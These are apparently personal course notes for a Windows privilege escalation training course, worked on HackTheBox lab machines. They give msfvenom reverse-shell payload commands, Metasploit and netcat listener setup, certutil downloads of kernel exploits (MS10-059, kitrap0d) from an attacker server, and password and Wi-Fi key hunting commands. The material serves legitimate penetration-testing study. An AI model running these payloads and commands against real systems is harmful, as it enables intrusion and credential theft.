
## Introduction

### Course Introduction

> [!note] 
> Resources for this video:
TCM Security Website - https://tcm-sec.com/
The Cyber Mentor Website - https://www.thecybermentor.com/
The Cyber Mentor Twitter - https://twitter.com/thecybermentor
The Cyber Mentor Twitch - https://twitch.tv/thecybermentor
My LinkedIn: - https://linkedin.com/in/heathadams

![[Pasted image 20230409140356.png]]

![[Pasted image 20230409140441.png]]

![[Pasted image 20230409140543.png]]

![[Pasted image 20230409140801.png]]


### Course Discord (Important)

> [!note] 
> Resources for this video:
> Course Discord - [https://discord.gg/tcm](https://discord.gg/tcm) 


### Resources and Tips for Success

> [!note] 
> Resources for this video:
Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html
PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
Sushant 747's Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


### Course Repo

> [!note] 
>  Welcome to the course. I truly hope you enjoy it and learn from it!
>  
>  Please see the attached link for a list of all resources used in the course. A very special thanks goes to Grimmie for putting this together! <3
>  
>  [https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources](https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources)
>  
>  Thank you!
>  
>  Heath


## Gaining a Foothold

### Introduction

> [!info] 
> To avoid Windows Licence cost's, this course is mostly based on HackTheBox / TryHackMe
> 

![[Pasted image 20230409142334.png]]

### Gaining a Foothold (Box 1)

Open HTTP and FTP Service:

FTP Server allow `anonymous` and as password `*anything*` Login.

> [!todo] 
> Create meterpreter web reverse shell
> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.87 LPORT=9001 -f aspx > shell.aspx`
> 

> [!todo] 
> run `msfconsole`
> `use exploit/multi/handler` 
> `show options`
> `set lhost tun0`
> `set lport 9001`
> `set payload windows/meterpreter/reverse_tcp`
> `run`

> [!todo] 
>  Open URL with `shell.aspx` on server.
>  Now we got `meterpreter` shell!
>  `getuid`
>  `sysinfo`

![[Pasted image 20230420150019.png]]

## Initial Enumeration

> [!todo] 
> In `meterpreter` shell:
> `shell`
> `systeminfo`
> `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
> `hostname`

![[Pasted image 20230420153212.png]]

> [!todo] 
> See when patches where installed:
> `wmic qfe` 
> `wmic qfe get Caption,Description,HotFixID,InstalledOn`

![[Pasted image 20230420153611.png]]

> [!todo] 
> Show connected volumes:
>  `wmic logicaldisk`
>  `wmic logicaldisk get caption,description,providername`
>  `wmic logicaldisk get caption`

![[Pasted image 20230420154022.png]]

![[Pasted image 20230420154133.png]]


### User Enumeration

> [!todo] 
> `whomai`
>  `whoami /priv`
>  `whoami /groups`

![[Pasted image 20230420155409.png]]

> [!todo] 
> `net user` 
> `net user <username>`
> `net localgroup`

![[Pasted image 20230420160933.png]]

> [!todo] 
>  `net localgroup administrators`

![[Pasted image 20230420161129.png]]


### Network Enumeration

> [!todo] 
>  `ipconfig /all` -> Under DNS, maybe we can see Domain Controller IP
>  `arp -a`

![[Pasted image 20230420164424.png]]

> [!todo] 
>  `route print`

![[Pasted image 20230420164812.png]]

> [!todo] 
>  `netstat -ano`

![[Pasted image 20230420165012.png]]


### Password Hunting

> [!note] 
> More Infos and Tips:
>  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-file-contents

> [!todo] 
>`findstr /si password *.txt` > Search in current and subdirectory
>`findstr /si password *.txt *.ini *.config`

> [!todo] 
> Wlan Password 
> `netsh wlan show profile`
> `netsh wlan show profile <SSID> key=clear`


### AV Enumeration

> [!todo] 
> Windows Defender:
> `sc query windefend` 

![[Pasted image 20230420171557.png]]

> [!todo] 
> Find other running Antivirus Software:
> Query running services:
> `sc queryex type= service` 

> [!todo] 
> Check Firewall Configuration:
>  `netsh advfirewall firewall dump`
>  If this is not returning anything, use:
>  `netsh firewall show state`

![[Pasted image 20230420172255.png]]

> [!todo] 
> `netsh firewall show config` 

![[Pasted image 20230420172448.png]]

## Exploring Automated Tools

### Automated Tool Overview

> [!note] 
>  Resources for this video:
>  - WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
>  - Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
>  - Sherlock - https://github.com/rasta-mouse/Sherlock
>  - Watson - https://github.com/rasta-mouse/Watson
>  - PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
>  - JAWS - https://github.com/411Hall/JAWS
>  - Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
>  - Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
>  - Seatbelt - https://github.com/GhostPack/Seatbelt
>  - SharpUp - https://github.com/GhostPack/SharpUp

![[Pasted image 20230420172800.png]]

> [!hint] 
> Nice Hack Tips:
> https://book.hacktricks.xyz


### Exploring Automated Tools

> [!todo] 
>meterpreter:
>` cd c:\\Windows\\Temp\\`
 >`upload /home/kali/Downloads/winPEAS.exe` 
> `shell`
> 

Sometimes there will be a issue that shell isn't working well, see example below:

![[Pasted image 20230422151951.png]]

> [!todo] 
>  we can try with meterpreter:
>  `load powershell`
>  But isn't working too on this box

> [!todo] 
> Use meterpreter to find possible exploits:
> `run post/multi/recon/local_exploit_suggester ` 

![[Pasted image 20230422152509.png]]

> [!todo] 
> run  `systeminfo` on Windows Target.
> Save result to systeminfo.txt

> [!todo] 
> `curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py  `
> `pip install xlrd==1.2.0 --upgrade` or with sudo
>  `python2 windows-exploit-suggester.py --update`
>  `python2 windows-exploit-suggester.py --database 2023-04-22-mssb.xls --systeminfo systeminfo.txt`

![[Pasted image 20230422160140.png]]


## Escalation Path: Kernel Exploits

### Kernel Exploits Overview

> [!note] 
> Resources for this video:
> Windows Kernel Exploits - [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) 

![[Pasted image 20230423143738.png]]

![[Pasted image 20230423143847.png]]


### Escalation with Metasploit

> [!note] 
> Resources for this video:
> Kitrap0d Information - [https://seclists.org/fulldisclosure/2010/Jan/341](https://seclists.org/fulldisclosure/2010/Jan/341) 

> [!todo] 
>  meterpreter:
>  `run post/multi/recon/local_exploit_suggester` > for all 32bit Windows versions
>  `background`
>  `use exploit/windows/local/ms10_015_kitrap0d`
>  `set session 2`
>  `set lhost tun0`
>  `set lport 5555`
>  `run`

![[Pasted image 20230423153111.png]]


### Manual Kernel Exploitation

> [!note] 
> Resources for this video:
> MS10-059 Exploit - [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059) 

> [!todo] 
>  `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.64 LPORT=4444 -f aspx > manual.aspx`
>  `nc -nvlp 4444`

![[Pasted image 20230423160307.png]]

> [!todo] 
> `python3 -m http.server` 

> [!todo] 
>   `nc -nvlp 5555`

> [!todo] 
> `certutil -urlcache -f http://10.10.14.64:8000/MS10-059.exe ms.exe`
> `ms.exe 10.10.14.64 5555`

![[Pasted image 20230423162606.png]]


## Escalation Path: Passwords and Port Forwarding

### Overview


> [!todo] 
> HackTheBox Start the Chatterbox VM and try to access and escape using the password stored in the VM. 


### Gaining a Foothold (Box 2)

> [!note] 
>  Resources for this video:
Achat Exploit - https://www.exploit-db.com/exploits/36025
Achat Exploit (Metasploit) - https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof

![[Pasted image 20230504142359.png]]

> [!todo] 
> Create own payload which will be executed on target 

> [!todo] 
> `sfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.46 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python` 

> [!todo] 
> Copy payload to script: 
![[Pasted image 20230504145721.png]]

> [!todo] 
> Start netcat listener:
> `nc -nvlp 443` 

> [!todo] 
> Execute python script and we will get a shell:
>  ![[Pasted image 20230504145809.png]]

> [!caution] 
> This exploit only work once. After VM has to be rebooted
> 


### Escalation via Stored Passwords

> [!todo] 
> Start Webserver on Attacker VM:
> `python3 -m http.server`
> Download winPEAS on Target VM:
> `certutil.exe -urlcache -f http://10.10.14.46:8000/winPEASx86.exe  winPEASx86.exe` 


![[Pasted image 20230504153135.png]]

![[Pasted image 20230504153544.png]]



![[Pasted image 20230504153718.png]]


    CHATTERBOX\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    CHATTERBOX\Alfred
        |->Groups: Users
        |->Password: CanChange-Expi-Req

    CHATTERBOX\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq
